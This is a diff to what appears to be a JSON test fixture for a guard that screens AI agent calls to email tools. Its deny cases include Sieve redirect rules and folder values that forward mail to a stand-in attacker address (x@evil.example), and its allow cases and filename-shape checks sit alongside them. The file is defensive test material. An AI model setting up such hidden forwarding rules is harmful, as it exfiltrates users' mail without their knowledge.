@@ -1504,7 +1504,12 @@
         "mcp__mail__new_mail_automation",
         "mcp__outlook__create_draft_autoreply",
         "mcp__mail__create_email_workflow",
-        "mcp__mail__draft_policy"
+        "mcp__mail__draft_policy",
+        "mcp__mail__update_mail_preferences",
+        "mcp__mail__update_email_options",
+        "mcp__mail__update_email_identity",
+        "mcp__mail__create_mail_delegate",
+        "mcp__mail__update_contact_email"
       ],
       "rule_like_inputs": [
         {
@@ -1545,7 +1550,10 @@
         "draft_gmail_message",
         "createForward",
         "create_event",
-        "create_rsvp"
+        "create_rsvp",
+        "createReplyAll",
+        "create-shared-mailbox-draft",
+        "create_calendar_entry"
       ],
       "not_plain_segments": [
         "create_draft_rule",
@@ -1571,7 +1579,12 @@
         "create_mail_config",
         "create_mail_hook",
         "create_mail_trigger",
-        "update_mail_routing"
+        "update_mail_routing",
+        "update_mail_preferences",
+        "update_email_options",
+        "update_email_identity",
+        "create_mail_delegate",
+        "update_contact_email"
       ],
       "label_segments": [
         "create_label",
@@ -1579,27 +1592,23 @@
         "rename_tag",
         "createFolder",
         "add_category",
-        "move_label"
-      ],
-      "not_label_segments": [
+        "move_label",
+        "delete_label",
         "create_mailbox",
         "rename_mailbox",
-        "delete_label",
+        "modify_labels",
+        "remove_label"
+      ],
+      "not_label_segments": [
         "get_label",
         "create_folder_rule",
         "update_label_settings",
         "create_label_filter",
-        "set_label_forwarding"
+        "set_label_forwarding",
+        "update_mailbox",
+        "set_mailbox"
       ],
       "deny": [
-        {
-          "tool": "mcp__outlook__move_message",
-          "input": {
-            "messageId": "x",
-            "destination": "Forwarded"
-          },
-          "note": "BE r2 B4: destination / target / targetFolder are not globally inert; on a non-plain tool a forward word there denies (fail-closed, accepted over-block for move_message)"
-        },
         {
           "tool": "mcp__sieve__put_script",
           "input": {
@@ -1822,6 +1831,74 @@
             "content": "redirect :copy \"x@evil.example\";"
           },
           "note": "R1 B3: profile is no mail noun (not file): no plain draft, the content gets the word test"
+        },
+        {
+          "tool": "mcp__protonmail__update_sieve_script",
+          "input": {
+            "folder": "forward to x@evil.example"
+          },
+          "note": "ea9215f6 AC13 (be-n4 gap s4): a forward instruction in a folder value of a Sieve tool denies, no tool class frees the folder key there"
+        },
+        {
+          "tool": "mcp__outlook__manage_rules",
+          "input": {
+            "folder": "forward to x@evil.example"
+          },
+          "note": "ea9215f6 AC13 (be-n4 gap s4): a forward instruction in a folder value of a rule tool denies, no tool class frees the folder key there"
+        },
+        {
+          "tool": "mcp__gmail__update_label_settings",
+          "input": {
+            "label": "Forwarded"
+          },
+          "note": "ea9215f6 AC19 fail-closed (Q1 accepted): a label settings tool is in the reply / settings class, which frees no label key"
+        },
+        {
+          "tool": "mcp__gmail__set_label_forwarding",
+          "input": {
+            "label": "Forwarded"
+          },
+          "note": "ea9215f6 AC19 fail-closed (Q1 accepted): a forwarding tool has no exemption, the label value gets the word test"
+        },
+        {
+          "tool": "mcp__outlook__update_mailbox_settings",
+          "input": {
+            "label": "Forwarded"
+          },
+          "note": "ea9215f6 AC19 fail-closed (Q1 accepted): the reply / settings class frees the reply text keys and the signature, not a label value"
+        },
+        {
+          "tool": "mcp__gmail__create_filter",
+          "input": {
+            "query": "subject:Fwd invoice"
+          },
+          "note": "ea9215f6 AC19 fail-closed (Q1 accepted, Brainy 6415): a filter tool has no selector exemption, the query gets the word test"
+        },
+        {
+          "tool": "mcp__gmail__create_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "subject": "s",
+            "body": "b",
+            "filePath": "/forwardTo"
+          },
+          "note": "ea9215f6 AC15: a plain draft frees a file key only for a file-name-shaped value; /forwardTo has no extension"
+        },
+        {
+          "tool": "mcp__gmail__create_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "subject": "s",
+            "body": "b",
+            "attachmentPaths": [
+              "/forwardTo"
+            ]
+          },
+          "note": "ea9215f6 AC15: a plain draft frees a file key only for a file-name-shaped value; /forwardTo has no extension"
         }
       ],
       "allow": [
@@ -2013,6 +2090,527 @@
           },
           "expected": "draft",
           "note": "T5 N4-B4: attachment name fwd_invoice.pdf (prose key)"
+        },
+        {
+          "tool": "mcp__gmail__delete_label",
+          "input": {
+            "name": "Forwarded"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: delete_label is a label tool; a folder-name-shaped name with a forward word is no forward"
+        },
+        {
+          "tool": "mcp__outlook__create_mailbox",
+          "input": {
+            "name": "Fwd"
+          },
+          "expected": "draft",
+          "note": "ea9215f6 AC12: create_mailbox is a label / folder tool; a folder-name-shaped name with a forward word is no forward"
+        },
+        {
+          "tool": "mcp__outlook__rename_mailbox",
+          "input": {
+            "title": "redirect"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: rename_mailbox is a label / folder tool; title is a name key there"
+        },
+        {
+          "tool": "mcp__gmail__modify_labels",
+          "input": {
+            "name": "Forwarded"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: modify_labels is a label tool (label-apply); a folder-name-shaped name with a forward word is no forward"
+        },
+        {
+          "tool": "mcp__outlook__create_folder",
+          "input": {
+            "displayName": "Tov\u00e1bb\u00edtott"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: a Hungarian folder name (accented letters) is name-shaped"
+        },
+        {
+          "tool": "mcp__outlook__move_message",
+          "input": {
+            "messageId": "x",
+            "destination": "Forwarded"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: moved here from the deny list (it was the 61fcac1e BE r2 B4 accepted over-block): a move tool frees the destination key for a folder-name-shaped value; a forward KEY and a non-name-shaped value still deny"
+        },
+        {
+          "tool": "mcp__outlook__move_message",
+          "input": {
+            "messageId": "x",
+            "targetFolder": "Forwarded Items"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: a move tool frees targetFolder for a folder-name-shaped value"
+        },
+        {
+          "tool": "mcp__imap__copy_email",
+          "input": {
+            "target": "Fwd"
+          },
+          "expected": null,
+          "note": "ea9215f6 AC12: copy_email is a move / copy tool; target is a folder key there"
+        },
+        {
+          "tool": "mcp__gmail__create_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "subject": "s",
+            "body": "b",
+            "attachmentPaths": [
+              "/tmp/Fwd_ajanlat.pdf"
+            ]
+          },
+          "expected": "draft",
+          "note": "ea9215f6 AC15 B6: top-level attachmentPaths of a plain draft, file-name-shaped value"
+        },
+        {
+          "tool": "mcp__gmail__create_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "subject": "s",
+            "body": "b",
+            "attachment_paths": [
+              "/tmp/Fwd_ajanlat.pdf"
+            ]
+          },
+          "expected": "draft",
+          "note": "ea9215f6 AC15 B6: top-level attachment_paths of a plain draft, file-name-shaped value"
+        },
+        {
+          "tool": "mcp__gmail__create_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "subject": "s",
+            "body": "b",
+            "filePath": "/tmp/Fwd_ajanlat.pdf"
+          },
+          "expected": "draft",
+          "note": "ea9215f6 AC15 B6: top-level filePath of a plain draft, file-name-shaped value"
+        },
+        {
+          "tool": "mcp__gmail__create_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "subject": "s",
+            "body": "b",
+            "fileName": "Fwd_invoice.pdf"
+          },
+          "expected": "draft",
+          "note": "ea9215f6 AC15 B6: top-level fileName of a plain draft, file-name-shaped value"
+        }
+      ],
+      "_ea9215f6": "Card ea9215f6 N1: exemption_segments = segment list + plain flag -> the class exemptionClass / _exemption_class names; relocation_* = the Sieve forms (referenced by label from sieve_forms) moved under the formerly global inert keys on the Sieve / rule / filter / B5 tools, all denied; relocation_shape_rows = a Sieve form as a NAME on a tool class that frees that name key, denied by the name shape; shape_cases = NAME_SHAPE / FILE_SHAPE verdicts (no @ in the name shape).",
+      "exemption_segments": [
+        {
+          "segments": [
+            "create_draft"
+          ],
+          "plain": true,
+          "expected": "plain"
+        },
+        {
+          "segments": [
+            "create_label"
+          ],
+          "plain": false,
+          "expected": "label"
+        },
+        {
+          "segments": [
+            "delete_label"
+          ],
+          "plain": false,
+          "expected": "label"
+        },
+        {
+          "segments": [
+            "create_mailbox"
+          ],
+          "plain": false,
+          "expected": "label"
+        },
+        {
+          "segments": [
+            "rename_mailbox"
+          ],
+          "plain": false,
+          "expected": "label"
+        },
+        {
+          "segments": [
+            "v2create_label"
+          ],
+          "plain": false,
+          "expected": "label"
+        },
+        {
+          "segments": [
+            "modify_labels"
+          ],
+          "plain": false,
+          "expected": "label-apply"
+        },
+        {
+          "segments": [
+            "remove_label"
+          ],
+          "plain": false,
+          "expected": "label-apply"
+        },
+        {
+          "segments": [
+            "move_message"
+          ],
+          "plain": false,
+          "expected": "move"
+        },
+        {
+          "segments": [
+            "copy_email"
+          ],
+          "plain": false,
+          "expected": "move"
+        },
+        {
+          "segments": [
+            "batch_modify_messages"
+          ],
+          "plain": false,
+          "expected": "msgop"
+        },
+        {
+          "segments": [
+            "mark_read"
+          ],
+          "plain": false,
+          "expected": "msgop"
+        },
+        {
+          "segments": [
+            "v2modify_thread"
+          ],
+          "plain": false,
+          "expected": "msgop"
+        },
+        {
+          "segments": [
+            "set_vacation"
+          ],
+          "plain": false,
+          "expected": "reply"
+        },
+        {
+          "segments": [
+            "update_settings"
+          ],
+          "plain": false,
+          "expected": "reply"
+        },
+        {
+          "segments": [
+            "update_mailbox_settings"
+          ],
+          "plain": false,
+          "expected": "reply"
+        },
+        {
+          "segments": [
+            "update_label_settings"
+          ],
+          "plain": false,
+          "expected": "reply"
+        },
+        {
+          "segments": [
+            "update_sieve_script"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "put_script"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "manage_rules"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "create_filter"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "v2create_filter"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "create_automation"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "update_mail_preferences"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "update_email_options"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "create_mail_delegate"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "update_contact_email"
+          ],
+          "plain": false,
+          "expected": "none"
+        },
+        {
+          "segments": [
+            "set_label_forwarding"
+          ],
+          "plain": false,
+          "expected": "none"
+        }
+      ],
+      "relocation_tools": [
+        "mcp__protonmail__update_sieve_script",
+        "mcp__sieve__put_script",
+        "mcp__fastmail__upload_script",
+        "mcp__outlook__manage_rules",
+        "mcp__gmail__create_filter",
+        "mcp__mail__create_automation",
+        "mcp__mail__update_mail_preferences"
+      ],
+      "relocation_keys": [
+        "label",
+        "labelIds",
+        "folder",
+        "mailbox",
+        "parentFolderId",
+        "destinationFolder",
+        "query",
+        "signature",
+        "responseBodyPlainText"
+      ],
+      "relocation_forms": [
+        "S1_copy",
+        "S2_nl",
+        "S7_comment"
+      ],
+      "relocation_shape_rows": [
+        {
+          "tool": "mcp__outlook__move_message",
+          "key": "destination",
+          "form": "S1_copy",
+          "fixed": {
+            "messageId": "x"
+          }
+        },
+        {
+          "tool": "mcp__gmail__create_label",
+          "key": "name",
+          "form": "S1_copy",
+          "fixed": {}
+        },
+        {
+          "tool": "mcp__outlook__create_mailbox",
+          "key": "name",
+          "form": "S2_nl",
+          "fixed": {}
+        },
+        {
+          "tool": "mcp__imap__copy_email",
+          "key": "target",
+          "form": "S7_comment",
+          "fixed": {}
+        }
+      ],
+      "shape_cases": [
+        {
+          "value": "Forwarded",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "Forwarded Items",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "Tov\u00e1bb\u00edtott",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "Tov\u00e1bb\u00edtott.pdf",
+          "name": true,
+          "file": true
+        },
+        {
+          "value": "Fwd",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "Forwarded\n",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a\nb.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "x@evil.example",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "redirect :copy \"x@evil.example\";",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a;b.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a:b",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a:b.pdf",
+          "name": false,
+          "file": true
+        },
+        {
+          "value": "\"q\".pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a'b.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "{x}.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "$x.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a|b.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "a b.pdf",
+          "name": true,
+          "file": true
+        },
+        {
+          "value": "Fwd_invoice.pdf",
+          "name": true,
+          "file": true
+        },
+        {
+          "value": "/tmp/Fwd_ajanlat.pdf",
+          "name": true,
+          "file": true
+        },
+        {
+          "value": "/forwardTo",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "x.abcdefghij",
+          "name": true,
+          "file": true
+        },
+        {
+          "value": "x.abcdefghijk",
+          "name": true,
+          "file": false
+        },
+        {
+          "value": "\ud83d\ude00",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "\ud83d\ude00.pdf",
+          "name": false,
+          "file": false
+        },
+        {
+          "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.pdf",
+          "name": false,
+          "file": false
         }
       ]
     }
